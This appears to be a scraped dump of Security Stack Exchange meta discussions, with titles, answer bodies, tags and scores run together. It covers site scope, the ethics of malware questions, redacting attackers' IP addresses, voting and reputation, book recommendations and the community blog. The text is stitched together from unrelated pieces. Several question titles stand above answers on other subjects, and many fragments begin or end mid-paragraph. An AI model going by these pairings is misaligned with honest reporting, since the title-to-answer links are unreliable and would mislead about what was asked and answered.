<p>Personally, I would not delete that question in particular, but there are other questions that maybe should be deleted (however given a lot of blogs already speak of Ransomware, this should be done only if SE gives to malware writers much more visibility).</p>

<p>Morality is personal, cultural, and often ambiguous. Personally I believe malware authors are scum, though some may disagree. But what about some kid that hacks Facebook in some relatively harmless, but clever way?  What about someone who offers an answer about getting past &quot;the great firewall of China?&quot;  Many people would approve of that here, unless you're a Chinese official.</p>
<p>If you start down the path of limiting certain people because you don't agree with them morally, where does it stop?  There's rarely clear guidelines, and unclear guidelines create self-censorship.</p>

What should I do if I managed to solve my own problem without a logic solution?,"<p>Self-answers are generally encouraged here, as it builds up a knowledge database. But I would disagree with @AviDs answer. </p>

<p>Building a knowledge database doesn't seem to be your intention. What you really seem to want is to know if X is true, which is clearly a question, not an answer. </p>

<p><strong>Pro your idea</strong></p>

<p>The only downside I see of making it a question is that if you are indeed correct, it is unlikely that someone will post an answer that basically just says ""you are right"", which would then mean that the amount of unanswered questions increases. The solution to that would be to hope that someone just posts that, maybe underlined with some sources or further explanation.</p>

<p><strong>Contra your idea</strong></p>

<p>The downside of posting your own maybe false answer is that you aren't actually sure about it. People unknowingly post wrong answers all the time, but I don't think it's ideal to knowingly post answers that may very well be wrong. It adds unnecessary noise, and may mislead people. And what if nobody contradicts you, even though you are wrong? On QnA sites, it is expected that answers are true as far as the person posting them is concerned. </p>

<p>So at a minimum, you would need to add a disclaimer to your answer, eg ""I have serious doubt in the correctness of this answer, and I am primarily posting it to get feedback on by though process"". But such a disclaimer really only shows that this is a question, not an answer.</p>

<p>Additionally, the QnA format isn't really build for this. Downvoting costs points, the character limit on comments is quite restrictive, deleted comments can't be seen, comments can't be edited, and so on.</p>

<p><strong>tl;dr</strong> Answers shouldn't be used to post questions as it doesn't fit the QnA format or this sites mechanisms. ""Is X correct"" is a perfectly valid question, but ""X, maybe? please comment"" is not a good answer.</p>

Add a WATCH option to questions so that any new answer will be notified,"<p>Books are among the <em>last</em> types of products that should be considered for exemption from the general rule on product recommendations.</p>

<p>Firstly, requests for books still suffer many of the same problems that are inherent to all product recommendations.</p>

<ul>
<li>Even with a well-written question, it's often hard to be sure of what personal preferences may sway an asker's ultimate choice for an accepted answer.</li>
<li>Even when given specific parameters, judging which one would ""best"" suit an asker's needs can be very subjective.</li>
<li>If budget is an issue, a product's suitability to meet the asker's requirement will change over time - and may especially be very short-lived in the case of promotional discounts.</li>
<li>To properly declare the ""best"" fit for anyone's needs - out of all the available products in a given space - requires a breadth of experience and sampling that practically nobody has, nor has time to acquire.</li>
<li>The list goes on, but I'll stop this part here.</li>
</ul>

<p>And all the while that they're sharing these problems with other product classes, books are probably the absolute worst suffers of this one:</p>

<ul>
<li>A product's suitability to fulfill any given need changes over time - often rapidly - as technology evolves, new solutions are developed, and previously-unrecognized problems with existing solutions are discovered.</li>
</ul>

<p>For comparison, let's look at some of the common things that SE gets asked for in these sorts of questions:</p>

<ul>
<li><strong>Websites</strong> and applications in the cloud are frequently updated to fix problems in content and functionality as they are discovered, add new features according to demand, and generally evolve along with the needs of their customers. This is usually done with absolutely zero effort on the part of the customer. This helps to maintain the website's value over time and can even serve to <em>increase</em> it - sometimes to the point that it could move <em>up</em> in rank when compared to competitors. (Though of course this also means a website's relative value could decrease if it doesn't keep up with its competitors' innovations.)</li>
<li><strong>Software</strong> can in many ways be, and often is, maintained similarly to websites in terms of patching flaws and bringing in new features on a regular basis. This typically requires minimal - and, in some cases, practically zero - effort or cost for the customer, unless a major new revision comes out that requires re-installation, a license upgrade, or (relatively infrequent) a re-purchase.</li>
<li><strong>Devices</strong> have a harder time keeping up with new developments, as the hardware they're shipped with usually cannot be changed to maintain pace with increasing requirements. If the hardware can be upgraded when necessary, it is usually a non-trivial issue for the customer and most often comes with a substantial cost. However, many devices can still have their lifetime extended - and, on occasion, value improved - by the issuance of firmware updates and upgrades. In that respect, they're a little bit like software but just a lot less flexible in general.</li>
</ul>

<p>And then we have...</p>

<ul>
<li><strong>Books</strong>, which do not change at all over time. Once bought, the dead tree matter will (at best) remain in exactly the same configuration as it had while it was sitting on the seller's shelf. Technology will move on, and often does very quickly, but the book's contents will not keep pace one iota. What is written as the absolute industry best practice in a book today may be revealed to have severe weaknesses tomorrow. But the book will still proudly proclaim that the broken solution is what you should be doing, and anyone who does otherwise is a moron. E-books provide an opportunity for the author/publisher to issue updates, but (and I'll grant I don't have much experience with this) I strongly doubt this is regularly done. More often, if you want to ""upgrade"" your book to a new version that has more current information, you'll have to shell out the full purchase price for a ""new edition"". And the vast majority of books never get one.</li>
</ul>

<p>So, my answer is no. Absolutely not. Ever. Even if the embargo on product recommendations gets lifted at some time in the unforeseeable future, there should be an exemption on <em>that</em> policy that keeps book recommendations (at the very least, for any kind that would be on-topic for Sec.SE) completely off-limits. Let the dead trees stay dead on Sec.SE.</p>

The question/answer you never though would score that high/low,"<p>One answer I provided I meant merely as an addendum to what I thought was someone else's perfectly great answer that had a good vote score already. I only wanted to provide a different perspective, and I wanted to add an additional useful answer.</p>

<p>My answer eclipsed the other answer and I rep trained for a few days.</p>

<p>Something similar happened a few days later, but there wasn't another answer. I figured someone else would come in over top of me with a more canonical answer, but even though more thorough answers were offered, my answer got most of the votes.</p>

<p>As a result, I think I learned something about tone. I think I might try to emulate the ""Bears"" too often in trying to provide an authoritative answer. In one case, I even interviewed a famous expert in order to come up with an answer to end all answers (it got 4 votes). But the attitude I had while writing high-scoring answers was much lighter and I took myself less seriously, I even avoided being complete. To quote Rory, they were ""throwaway answers"".</p>

<p>But, here's the thing: I'm not sure that my high point answers are good answers, and I don't think that I should make all my answers emulate them. They might speak to the audience and reach some inner curiosity: ""I never thought of that!"" or ""I always thought that was true"" or some such, but they aren't the answers I'm proud of.</p>

",<discussion><asking-questions>,1,,67
Is this popular question really on-topic?,"<p>In my experience, ""Incident analysis"" is part of a formal event lifecycle.   A collection of security events, through automated or manual correlation are collected for formal analysis.</p>

<p>From a procedural standpoint, incident analysis may result in an investigation.   The difference being the depth of analysis, the expertise of the investigator, the time they spend and the expectations of the report.  If an incident takes more than a few minutes to analyze, it should be raised for an investigation, else it's interfering with daily monitoring tasks.</p>

<p>One problem with the word ""incident"" is that outside the security practice, it is a much heavier word, associated with successful breaches, denial of service, virus outbreaks etc.  It's accurate there too, but when customers ask for reports of your most recent security incidents, they're not asking for the false-positive the printer generated, or the massscan which hit you on Tuesday.   They want the big stuff.</p>

<p>Investigations also go way beyond the Incident-analysis meaning, including missing laptops, devices knocked offline, indications of inappropriate access, missing evidence of authorization before granting access to systems, etc.</p>

<p>For now, the meaning of the word depends on who I'm talking to.  If I'm talking to SOC analysts, ""Incident"" means a bunch of correlated events.  ""Investigation"" means what you're doing with those correlated events.   </p>

<p>If I'm talking to customers or management ""Incident"" means a breach or similar security fail, while ""Investigation"" means a multi-day or multi-week thing which is going to have a root-cause analysis and will result in an ugly MS Word document filed for review by auditors, investors or customers.</p>

<p>The outside world and even the best product documentation confuses the language.  E.g., I've been reviewing Splunk's capabilities in regard to incident analysis, even they get fuzzy on the terms... notice how it's the ""Incident review"" dashboard, but they talk about ""Events"", ""Notable Events"" and ""investigation""</p>

<p>It is true that nuking from orbit is not a ""very accessible"" option, maybe for economic reasons or because the user doesn't have a clean backup of his personal data. However, there are a lot of situations in IT (not only related to security) for which a user calls tech support, only to hear that he should buy another computer. It is not pleasant, but sometimes it is the only way. Although we are not a tech support website, I feel we have the duty to answer honestly, even if the solution is, so to say, a bit brutal.</p>

<p>Of course, there are also cases in which nuking from orbit may not be required. There was a recent question (that I can't find now) in which the OP explained that a friend told him he had gained access to his phone. In my opinion, nuking from orbit simply because a friend told you that he hacked your phone is slightly an exaggeration (who would want to throw $500 or even more out of the window because of a potential prank?), although it may be actually necessary.</p>

<p>This answer is: reinstall your PC <sup>(*)</sup>. This is the only reasonable solution for someone who is not experienced -- and he is not as he is asking this question.

Why it is opinion based to ask for possible pitfalls of an concept?,"<p>The <a href=""https://security.stackexchange.com/help/dont-ask"">Security.SE Help Center</a> specifically says:</p>

<blockquote>
  <p>You should only ask <strong>practical, answerable questions</strong> based on <strong>actual problems</strong> that you face. Chatty, open-ended questions diminish the usefulness of our site and push other questions off the front page.</p>
</blockquote>

<p>The idea of an AI which is so powerful to automatically solve CAPTCHAs <strong>and</strong> to automatically write useful comments based on a given context is not currently practical. While <a href=""https://security.stackexchange.com/questions/48022/what-kinds-of-encryption-are-not-breakable-via-quantum-computers?rq=1"">there are</a> <a href=""https://security.stackexchange.com/questions/25251/impact-of-quantum-computers-other-than-new-algorithms"">questions</a> in this SE about the impact of quantum computers on cryptography, they are more practical because the technology is partially available and because basic ideas are already present (post-quantum algorithms).</p>

<p>Your question, on the other hand, takes for granted something that we cannot really understand, and that would bring so many complications that a definitive answer cannot exist (i.e. <strong>not answerable</strong>). </p>

<p>An AI with that level of sophistication could pass the Turing test, which means that it would be indistinguishable from human users. This, in turn, would mean that the spambot problem would be equivalent to the trolling problem on online communities, if the AI comments were not random but still not constructive, or to an even more complex problem, if the comments were also constructive.</p>

<p>For example, what would happen if human users rated as ""not constructive"" a comment which is actually meaningful, but conveys an opinion contrary to that of the majority of the users in the community? This is possible, and it already happens in some online communities. How could you distinguish between a constructive comment downvoted for this reason, and a comment downvoted because it is generated by an AI spambot? </p>

<p>Would it even make sense to talk about spam, and if so, how could we draw the line between this kind of ""spammer"" and a user with a different opinion from the majority? </p>

<p>This problem would not belong to information security anymore, not even remotely. Since you asked about an AI writing constructive comments, this is the only possible problem that would arise, and because it would not be an information security issue, your question is off-topic.</p>

Is this question about doing damage on a system ethical and on-topic?,"<p>I think the question is on topic, ethical and useful. If you find a vulnerability on your system you need to do these things:</p>

<ul>
<li>Make a decision if you should take down the app immediately.</li>
<li>Figure out if an attacker has already used the vulnerability to breach your system.</li>
</ul>

<p>Understanding what the vulnerability could be used for is key to both those things, and indeed the OP was given the very valuable advice to take the app down immediately. Had he not asked, he might not have realised how sever the vulnerability was.</p>

<p>There is a close reason for people asking help on how to hack things:</p>

Is this question about doing damage on a system ethical and on-topic?,"<p>How about something like:</p>

<p>Your question has been marked as a duplicate of this one because you've asked whether a specific security scheme you have developed is secure. This question is commonly asked, but it isn't really answerable on Security.se.</p>

<p>There are two stages to demonstrating that any conceived security scheme is secure. Firstly, the creator should themselves look to prove the strength, by demonstrating properties which can be mathematically proven which the scheme takes advantage of. Secondly, once they've done this, they should take these proofs and the scheme to other people, asking them to find any flaws. This is to ensure that the creator hasn't missed something in the creation or proof phases, and should be considered a positive thing - if flaws are found, they can be fixed, or the scheme can be halted before being used in live environments.</p>

<p>For example, the <a href=""http://keccak.noekeon.org/"" rel=""nofollow"">Keccak</a> hashing algorithm, which became SHA-3, was first published in 2006, with the authors providing details on elements of previous hashing algorithms which they attempted to improve in <a href=""http://keccak.noekeon.org/TheRoadFromPanamaToKeccak.pdf"" rel=""nofollow"">a paper</a>. They also proved mathematically various components of the algorithm, showing that various properties were held by it. It was then part of the NIST SHA-3 competition, starting in 2008, where some flaws were found by the teams of cryptographers looking at it, and it could be refined and improved to fix these.

<p>If you have created a new scheme, you should first look to find vulnerabilities yourself, building a working implementation and trying to spot undesirable features or flaws. For example, a new password storage method would need to demonstrate that it doesn't store the same value for two users with the same password, among other things, and this can be demonstrated easily. Only once you can prove that your system fixes known flaws in existing systems, or at least reduces them, should you look for third party validation. This could come from university researchers or specialist security audit companies, but takes time and resources which unpaid security.se visitors are unlikely to be able to offer.</p>
",<discussion><scope><specific-question>,2,,55
Is this question about doing damage on a system ethical and on-topic?,"<p>In my opinion, we don't need to know the IP addresses, at least not in their complete form.</p>

<p>Maybe if those addresses are already blacklisted, and the OP doesn't know it, we could tell with some confidence that they are probably being used to carry out some attack, as opposed to be (for example) the addresses of normal users who entered the wrong password. </p>

<p>But usually, after the third or so login attempt, we can already say that an attack is going on. As far as DDoS attacks are concerned, they most likely use botnets, and if a regular user is caught in the crosshairs of an anti-DDoS IP ban, a successful DDoS defence may be well worth it. In all other situations (SQL injections, port scanning, etc.), the knowledge of the IP address is - in my opinion - useless for the purpose of an answer, and could only be useful if the OP decided to file a report to the police.</p>

<p>Another possible reason could be geolocation. Once in a while, questions arise on whether to block or not IP addresses based on geolocation. Sometimes this might be useful (e.g. to protect SSH servers from Chinese IP addresses, if it is only used by devices in the USA, without the need of a VPN, etc.), but sometimes it is not. In any case, the last octet is of no use, and in most cases the last two octets are irrelevant, since most country-level IP blocks are defined by the first two octets.</p>

<p>In the end, I think we should at least redact the last octet, and possibly the last two octets.</p>

<p>By the way, Lasagna pointed out that the edit history is visible. I don't think this is a serious issue, given that IP addresses are not meant to be secret, and that they cannot be easily tied to an individual. Even if that was a problem, <a href=""https://meta.stackexchange.com/questions/132117/what-should-i-do-if-a-user-posts-sensitive-information-as-part-of-a-question-or"">moderators can intervene and redact the history</a>. </p>

Can we merge [session] and [session-management]?,"<p>An IP address is, by definition, not private.  It's not personally identifiable information.  An IP address alone means nothing, and can't be connected to an individual.  </p>

<p>At best, you MIGHT be able to tie it to a company where the traffic is coming from.</p>

<p>IP addresses of attackers is often times very useful information.  There's well known sites on the internet that host spambots, attack tools, etc.  This can be very revealing to the nature of the attack or the attacker.</p>

Im not a lawyer or anything but in my opinion, that should get you off the hook for merely disclosing IP adresses. Just keep in mind that slander and defamation of character could still be issues. So just be careful not to portray any provided IP addresses as doing intentionally wrongful or illegal actions (except when it is blatantly obvious), and you will be just fine.</p>

<p>Having the full IP address would allow other users to:</p>

<ul>
<li>Get its reverse host</li>
<li>Look up the owner of that address</li>
<li>Check for its presence in blacklists</li>
<li>Verify if it appears on the logs of other users</li>
</ul>

<p>And removing the IP address won't remove it from the edit history, anyway. For a proper hiding, it should have been performed by the OP before asking.</p>

<p>Generally, assuming that the logs are faithful, there shouldn't be much an issue that the attack logs get public.</p>

<p>However, if some addresses prove to not be from an attacker (whoops, there are IPs from several legitimate users there), I would support its hiding.</p>

Grammar VS style fixes,"<p>I'm not sure that qualifying these links of <em>""very hard""</em> to distinguish is the right term, at least not on a general basis.</p>

<p>However, where I agree with you is that depending on the screen settings and potential visual limitations affecting the reader, these links may indeed be hard to distinguish from normal text.</p>

<p>That's the reason why often visual indications such as links rely on two different criteria, traditionally links are shown:</p>

<ol>
<li>Using a different text color,</li>
<li>Underlined.</li>
</ol>

<p>This also allow the reader to detect successive different links, which is just currently impossible on StackExchange without hovering the links.</p>

<p>However, underlined text within a paragraph may also slightly reduce readability and comfort (that's why Wikipedia for instance choose to underline them only while hovering, as a right balance), and a poster on <a href=""https://ux.stackexchange.com"">UX.se</a> also <a href=""https://ux.stackexchange.com/a/14361/73288"">suggested the following</a>:</p>

<blockquote>
  <p>I'm pretty sure that this is an intentional part of the Stack Exchange
  UX.</p>
  
  <p>Answers are supposed to be standalone, because external sites may go
  offline, or rename/take down the page linked to. If they primary
  content of the answer was a link to another site, then that answer is
  now useless.</p>
  
  <p>The links are not underlined, so as not to distract from the answer,
  since they're supposed to only go to supplemental material. Similar
  reasoning exists for using colors that have less contrast to the text
  as opposed to the general web.</p>
</blockquote>

<p>So, without being into StackExchange little secrets, chances are this may be intentional and that arguments privileging text readability and unity over links parsing easiness simply won.</p>

Keeping passphrase away from telepathic interception,"<p>On a more general basis, questions regarding theoretical threats are usually closed as off-topic here because one could imagine an infinite number of theoretical threats with as much questions whose answers will be of no practical use for anybody (trust me some people may be <em>very</em> creative when they convinced themselves they are being spied upon).</p>

<p>That's why you will not find a study on this site about <a href=""http://www.theatlantic.com/health/archive/2012/09/tin-foil-hats-actually-make-it-easier-for-the-government-to-track-your-thoughts/262998/"" rel=""nofollow"">the best shape for tinfoil hats</a> ;).</p>

<p>On this site we try to focus on current, documented knowledge. This does not prevent things which first appear to be sci-fi to become actual facts, but they become so after a proper demonstration or irrefutable proof that the technique is <em>practically</em> usable (even a lot of things which are true in lab conditions become unusable in real life scenarios).</p>

<p>Meanwhile, most theoretical issues can be boiled down to some already known (and often already addressed) issues. For instance, in the current case as suggested by other members your question falls into ensuring that some user cannot determine just by himself the right password to connect a service, with OTP being the most standard way to address this.</p>

<li><p>Ask positively ""Does attacker need to know X to perform Z attack?""<br>
instead of what you are doing now: ""Is attack Z impossible without knowing X?""</p></li>
<li><p>Your question will be re-posted to the home page each time you edit, so the title is important. I think your current title is too long, and should be re-worded similarly.</p></li>
<li><p>Avoid editing on unrelated questions. I see you have an ""Additionally"", and you also added a question in the comments.

Do questions about test vectors belong to Crypto.SE or SEC.SE?,"<p>Many questions about cryptography are also about security and so are on-topic here as well as on Crypto.SE. For example, our many questions about password hashing are on-topic on both sites — but they would get different answers: Crypto.SE tends to have answers aimed at crypto designers and implementers, while on this topic Security.SE caters mostly for system administrators and end-users. The general observation about questions on-topic on both sites is about this kind of questions.</p>

<p>A question like “how do I find test vectors for this algorithm” has nothing to do with security. Whether a cryptographic algorithm matches a security policy is about security. Whether a cryptographic implementations is secure against a threat is about security. But getting the mathematical computation right is not about security. “How do I find test vectors for this algorithm” is off-topic here.</p>

<p><a href=""https://security.stackexchange.com/questions/133198/nist-test-vectors-for-rsassa-pkcs1-v1-5-sign-with-the-sha-256-hash-function"">https://security.stackexchange.com/questions/133198/nist-test-vectors-for-rsassa-pkcs1-v1-5-sign-with-the-sha-256-hash-function</a> is off-topic here but on-topic on Crypto.SE, so it should be migrated to Crypto.SE.</p>

<p><a href=""https://security.stackexchange.com/questions/38411/nist-test-vectors-for-hmac-sha-256"">NIST test vectors for HMAC-SHA-256</a> is off-topic here but on-topic on Crypto.SE, so it should be migrated to Crypto.SE. However, there is a <a href=""https://meta.stackexchange.com/questions/151890/disable-migration-for-questions-older-than-60-days"">stupid limitation that questions older than 60 days cannot be migrated</a>. So we're stuck either leaving an off-topic question open, or closing the question in place.</p>

<p>Like several other Stack Exchange sites, starting with Stack Overflow, Sec.SE's scope has tightened a bit over time. In the early days, it was more accepting of off-topic (e.g. non-security-related crypto) or unanswerable questions (e.g. polls), in the name of increasing traffic. Years later, this is a legacy that causes unfortunate effects. (Now where have I seen that before?) There's no perfect solution.</p>
",<discussion><migration>,2,,43
Do questions about test vectors belong to Crypto.SE or SEC.SE?,"<p>“Product recommendation” is a bit vague. Most questions on Stack Exchange take the form “I have this problem, how do I solve it?”. Sometimes the natural solution to a problem is to use a ready-made product. In such cases, the question is considered a product recommendation question.</p>

<p>Questions may be formulated as a product recommendation request, when the question explicitly includes the expectation that a solution will be a ready-made product. We tend to frown on these questions because they often fall into some common pitfalls: asking what the best product and forgetting to state the precise problem that needs solving.</p>

<p>“What's the best product of this type?” is <a href=""https://softwarerecs.stackexchange.com/help/dont-ask"">not an answerable question</a> and such questions should be closed. This is what the close reason is about. Because of a system limitation, the close reason is listed under off-topic, even though that doesn't make sense when the product type is related to security — but custom close reasons can't be added under “too broad” or “unclear what you're asking”.</p>

<p>“How do I solve my [sufficiently precisely stated] problem?” is a valid question, and the close reason does not apply to these. As the second sentence states, “describe your situation and the specific problem you're trying to solve” — and then you should have a good question. It's often best not to frame the question as “What product should I use?” but as “how do I solve my problem?”. Nonetheless, some problems <em>do</em> naturally call for a ready-made product. When product solutions are expected, I recommend following the <a href=""https://softwarerecs.stackexchange.com/help/on-topic"">Software Recommendations</a> <a href=""https://softwarerecs.meta.stackexchange.com/questions/336/what-is-required-for-a-question-to-contain-enough-information"">question</a> and <a href=""https://softwarerecs.meta.stackexchange.com/questions/356/what-is-required-for-an-answer-to-be-high-quality"">answer</a> guidelines.</p>

<p>In the specific case of <a href=""https://security.stackexchange.com/questions/133141/is-there-free-software-than-decrypts-a-single-file-on-windows-and-android"">https://security.stackexchange.com/questions/133141/is-there-free-software-than-decrypts-a-single-file-on-windows-and-android</a>, there is a specific problem to solve, so this question is fine for Stack Exchange. It doesn't fall under the “product recommendation” close reason. However, this question is off-topic here, because the question is a purely functional one: it's driven by software compatibility, not by security policies. Since the question does follow the “software to do X” model, it is on-topic on <a href=""https://softwarerecs.stackexchange.com/tour"">Software Recommendations</a> where it has been <a href=""https://softwarerecs.stackexchange.com/questions/35299/is-there-free-software-than-decrypts-a-single-file-on-windows-and-android"">migrated</a>.</p>

No https links on https page,"<p>Please vote to close (or not) based on the question in its current form.</p>

<p>This is especially important with migrations (“belongs on …”), because having a question migrated then closed is a far worse experience than closed on-site. When a question is migrated from site A to site B, it is closed and locked on site A and created open on site B. If site B closes the question then it is locked on site B and unlocked, but still closed on site A. Edits and comments made on site B are effectively lost (you can find them if you dig but they aren't visible on site A).</p>

<p>If you think a question would be suitable on another site after an edit, make the edit first, then vote to migrate. If you think a question could be suitable on another site but it requires an edit from the asker, vote to close without migration, and leave a comment like “your question is off-topic here because … and also lacks ….

<p>The accepted answer does not imply a correct answer.  It only states that the answer was (most) useful to you (the person who asked the question).

"How is a question about dealing with a possibly compromised router or modem an ""exact duplicate"" of a question about a compromised server?","<p>In general, and this is why I agreed with the flags and other close votes, a compromised device is a compromised device. It needs to be removed from service, imaged (if forensic investigation is going to be carried out), wiped, and rebuilt from new or from backup.

<p>A router does carry an OS, and in many cases this isn't dramatically stripped down from a server OS. Ideally it just has the functions it requires to service its role, but this is not always the case.</p>

<p>Regarding RetroShare just a quick search at a CVE repository returned a <code>libupnp</code> (firewall hole puncher often used by P2P software) bug <a href=""https://bugs.mageia.org/show_bug.cgi?id=19008"" rel=""nofollow"">reported to mageia linux</a>.

<p>It also provides a good way to make the question: by listing the dependencies of RetroShare, searching for vulnerabilities pertinent to these dependencies, and then asking for mitigation techniques if you happen to use a vulnerable version of the dependency.  (e.g. to mitigate the vulnerability in libupnp you could run RetroShare in a chroot jail)</p>

<p>The community blog <strong>accepts stories that are published on personal blogs of our users</strong>.  This is not to say that we make a personal blog promotion and marketing suite out of the sec.SE community blog.  There are rules:</p>

<blockquote>
  <p>Any member of the community can contribute. If you have a suggestion for a post here, comment on meta. Regular contributors are given an account on the blog, where they can submit posts to be reviewed. We have also selected Editors who can review and publish posts.</p>
</blockquote>

<p>But this should be a win-win situation with the personal blog.  Since our users can promote the content in whichever way they want (i.e. linking to their personal blog <strong>or</strong> to the community blog).</p>

<p>The only thing we need to do is to make the blog more known around our users.  For example, I did not know it exists until an hour ago.</p>

Can I ask a high-level / overview question?,"<p>Thats a good question, and I have struggled with it myself. How you vote is up to you and I do not want to tell you how and when to vote, but these are my informal guidelines for upvoting answer to questions where I do not have the knowledge to to assess if the answer is correct or not:</p>

<ul>
<li>If there seems to be some controversy (in comments, other contradictory answers, a couple of downvotes if you have rep to see them) I usually abstain from voting.</li>
<li>If the question or answer is so freash that above mentioned controversy would not have happened yet, I usually abstain from voting.</li>
<li>If the question is semi subjective and I could imagine there being multiple other perspectvies, I usually abstrain from voting.</li>
</ul>

<p>This lets me upvote the vast majority of good answers on questions I do no have any knowledge about, while I hope to avoid giving credit where it is not due. Off course these are not super strict rules, and I do break them when I really like an answer. I agree with Rory's general spirit - don't sweat it, we will be fine.</p>

<p>I should mention that another possible heuristic is the amount of rep that the person answering the question has, but I try to avoid using that since it feels unfair.</p>
",<discussion><acceptable-question><specific-question>,3,,76
Can I ask a high-level / overview question?,"<p>Here are my thoughts on how to handle situations like this:</p>

<ul>
<li>Do not roll back the roll back. That is just starting an edit war and will lead you nowhere.</li>
<li>You can leave a comment (as I did) and try to explain. If you do, do it as politely as possible. Someone else using a bad tone is not an excuse for you to do the same. If you do not feel that you have the energy to be polite and clearly exaplain the issue, then do not leave a comment at all.</li>
<li>You can absolutely flag for moderator attention. A lot of situations are borderline if they warrant action or not. In those I usually flag, and let the moderators draw the border. You can look at your flag history and see if your flag was rejected. Unless you have lots of rejected flags I would not worrie about disturbing moderators with unnececary flags.</li>
</ul>

<p>Personally I would not both comment and flag as that just adds to many voices. Instead I would pick one based on how severe I think the case is. In this case I commented and did not flag, but given the developments following your flag I think flagging would actually have been a better decision.</p>

<p>Thats my two cents, not sure if they are in line with what others think. Anyway, thanks for taking the time to try to figure out how to handle these situations in a good way!</p>
",<discussion><acceptable-question><specific-question>,3,,76
Can I ask a high-level / overview question?,"<p>The primary reason for voting isn't to reward the person answering; nor to confirm that high-reputation users necessarily write better answers.</p>

<p>The primary reason for voting is to identify a high-quality answer. Your signal (upvote or downvote) is seen by the OP, and seen by future visitors to the site: who may not know about the subject, and/or who want to sort the answers by vote-count so they read high-quality (upvoted) answer first.</p>

<p>For these reasons I wouldn't upvote an answer unless I knew (unless I was able to confirm) it's true.</p>

<p>You might also upvote answer which you personally find useful.</p>
",<discussion><acceptable-question><specific-question>,3,,76
Can I ask a high-level / overview question?,"<p>It does look sensible as a question, until the question itself.  You did some research and you summarized it, that's <strong>very</strong> good.</p>

<p>But then you start asking things that are completely subjective.  No one can really tell what a customer will ask you, for the simple reason that the customer may have a wide range of awareness of information security issues.  Moreover, asking for a recommendation (of something to read) that will make you an expert is off-topic on the site.</p>

<p>Finally the checklist approach you cite is actually your nemesis, which explains why you believe in asking the question that way.  One of the biggest reasons there are so many security flaws in software/hardware is the checklist approach.  You need to change that approach into understanding to be able to perform well against all the issues you enumerate.</p>

<p>Understanding does not mean being an information security expert.  No one (well, probably almost no-one) can be an expert in all aspects of InfoSec, going from cold boot attacks, to watermarking encryption, to XSS, to ALSR workarounds.  You only need the understanding of the issue you face, and then of how computers work around that.  You already did part of it by analyzing that Azure managed hosting will provide you with SaaS instead of plain IaaS, and that way you have a couple of issues less to worry.</p>

<p>(The security of Azure cloud may not be perfect, none is, but it is likely to be better than what can be done single-handedly in a limited timeframe.)</p>

<p>Objectively, modify your question to ask about the issues through which the data can be accessed in a networked application (I assume it is a networked application):</p>

<ul>
<li><a href=""https://www.owasp.org/index.php/Top_10_2013-Top_10"" rel=""nofollow noreferrer"">OWASP top 10 has several network vulnerabilities</a></li>
<li><a href=""https://security.stackexchange.com/questions/43639/why-is-the-access-control-allow-origin-header-necessary"">will you use CORS?</a></li>
<li><a href=""https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"" rel=""nofollow noreferrer"">XSS is always there, and very dangerous</a></li>
<li><a href=""https://security.stackexchange.com/questions/41988/how-does-sslstrip-work"">You say HTTPS, but what about HSTS?</a></li>
</ul>

<p>And last but not least <a href=""https://security.stackexchange.com/questions/12521/protection-of-keys-passwords-on-virtual-hardware-xen-kvm-vmware-etc"">your hosting provider always has full access to the data</a>.</p>

<p>Next you will need to find the weakest link of all of those (maybe discounting the hosting provider since that is their liability really), and ask the question on whether that is really the weakest link.  And, moreover, what would be the best mitigation.</p>

<p>When you can build the question you will not have to worry about questions a customer may make (unless they're particularly clueless) and not rely on checklists.  Your question will be able to fit into the <em>""satisfy my conscience""</em> part, you cite, in leaving someone's sensitive data private.</p>

<p><strong>Extra note</strong>: Given that you plan to be a small software vendor of products that may be run by government agencies, and that process sensitive data, you <strong>do</strong> need a lot of information security awareness.  Making a mistake in that area has huge repercussions (and often also liability).  A checklist approach to that is <strong>extremely</strong> dangerous in that situation, and I would highly advise against it.</p>

  <p>Do we want to continue with our blog?</p>

<p>My vote is no. The last post was 8 months ago, and the few blogs I follow are already well-established in the infosec community. I don't really look at Security.SE as a place to get cutting edge information. The community was inundated with dirty cow questions. Something like that would have been useful IMNSHO in a blog post. However, this community has a wiki that can be added to as well, and for the use cases that I see of a wiki and a blog in Security.SE, it seems to be duplicate effort.</p>

<p>However, if there is a renewed effort to write content, I'll support it. My primary question will be ""what will be in a blog?"" Will it be an aggregate of user blogs? Cool. I have one place to go if I'm looking for content. But <em>I</em> don't see the blog here as a source for fresh information. Security.SE is a place for me to help others with security questions.</p>

"New to the site, how does reputation work?","<p>In a nutshell rep is a different pool for each network site. So say if I was on this network site with a 3k rep and then joined the autos SE site. There is no way to genuinely know I am knowledgeable in that area without proving it. Hence, having to rebuild rep for that particular area. However once you gain 200 rep on a single network you are automatically given a bonus 100 rep for new networks you join. This way you can forgo a lot of the new user restrictions.</p>

"New to the site, how does reputation work?","<p>Roughly speaking, reputation is a measure of how knowledgeable you are in an area. Basically, users with higher rep are supposed to know what they're talking about more (but in practice it doesn't always work that way...)</p>

<p>According to your <a href=""https://security.stackexchange.com/users/129040/staycator"">profile page</a> you have:</p>

<ul>
<li>1 rep on Security</li>
<li>1 rep on Code Review</li>
<li>11 rep on Cross Validated</li>
</ul>

<p>so I'm not sure where you saw that you had 200 rep. Are you sure you didn't hit ""sign up"" instead of ""sign in"" and create a second account? I've seen people make that mistake before.</p>

<p>In the Stack Exchange network (including Stack Overflow) there are 3 types of posts:</p>

<ul>
<li>Questions</li>
<li>Answers to someone else's question.</li>
<li>Comments on someone else's question or answer.</li>
</ul>

<p>You gain reputation when people upvote your questions or answers (comments can be upvoted, but are not worth rep). You have <a href=""https://security.stackexchange.com/questions/141157/is-it-dangerous-to-use-default-router-admin-passwords-if-only-trusted-users-are/141608#141608"">one answer</a> on Security, but it has no upvotes, hence why you are still at 1 rep.</p>

<p>The rules to prevent brand-new accounts from posting comments is to reduce spam and lower the amount of work for the moderators. It's kinda sucky but unfortunately I think it's necessary.</p>

<p>Welcome to the site, I hope you get a feel for it. If you are brave enough to start throwing answers on stuff, you should be over 200 rep in a week or two (don't be discouraged if you get downvotes at first, the rules for a Q&amp;A site are a little stricter than reddit or a message board, so it takes some getting used to).</p>

  <p>I apologize if posting an answer to my own question is not preferred on Meta, but I couldn't have fit everything into a comment. TL;DR, check the block quote at the bottom of this post for the proposed question.</p>
</blockquote>

<p>This is what I have come up with, and what I think the question should involve. Any and all input is appreciated. </p>

<p>The question should cover ""Who can see my data over a network?"" in a very general way, but will still need to address some specific concerns, these being:</p>

<ol>
<li>Is the ""attacker"" actively or passively listening in?</li>
<li>What measures are in place already? Is there a proxy?</li>
<li>What is the level of authority the ""attacker"" has on the network? </li>
